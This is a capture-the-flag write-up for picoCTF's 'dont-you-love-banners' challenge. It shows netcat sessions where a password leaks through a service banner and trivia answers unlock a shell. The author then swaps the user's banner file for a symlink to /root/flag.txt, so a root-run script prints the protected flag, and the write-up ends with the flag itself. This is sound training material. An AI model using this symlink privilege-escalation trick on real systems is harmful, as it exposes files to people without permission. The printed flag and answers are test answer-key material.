# dont-you-love-banners

# Description
Can you abuse the banner?
Additional details will be available after launching your challenge instance.
# Solution

-  After connecting both server the first one display some information about something that looks like a ssh connection , in the second server it ask for a password that is the one reveled at the first server then it ask for more questions that can be easily found in the web after responding the questions I get a session with a user at the server.

``` bash
nc tethys.picoctf.net 53461
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
nc tethys.picoctf.net 55639
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON           
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ cat banner
*************************************
**************WELCOME****************
*************************************
```

- Once I get into the server exploring the files at home directory I didn't find any flag going further into the root directory there's 2 files ```flag.txt``` and ```script.py``` after trying to show the flag with a single ```cat``` command I get to know that I don't have enough permission so I try to run the python script then it displayed the same text  of the first connection where I had to answer the questions since It display the banner when I connect to the server I deleted the banner file at home directory and created a link to the flag file with the exact same name since it has the same name when I reconnect to the server I get the flag.

```bash
cd root/
player@challenge:/root$ ls
ls
flag.txt  script.py
player@challenge:/root$ ls -la
	ls -la
total 16
drwxr-xr-x 1 root root    6 Mar 12  2024 .
drwxr-xr-x 1 root root   29 Apr 14 22:55 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar 12  2024 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py
player@challenge:/root$ cat flag.txt
cat flag.txt
cat: flag.txt: Permission denied
python3 script.py
what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON           
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
cd 
player@challenge:~$ rm banner	
rm banner
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
nc tethys.picoctf.net 55639
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}
```

# References
- [LU1F3R /picoCTF-2024](https://github.com/LU1F3R/picoCTF-2024/blob/main/dont-you-love-banners.md)

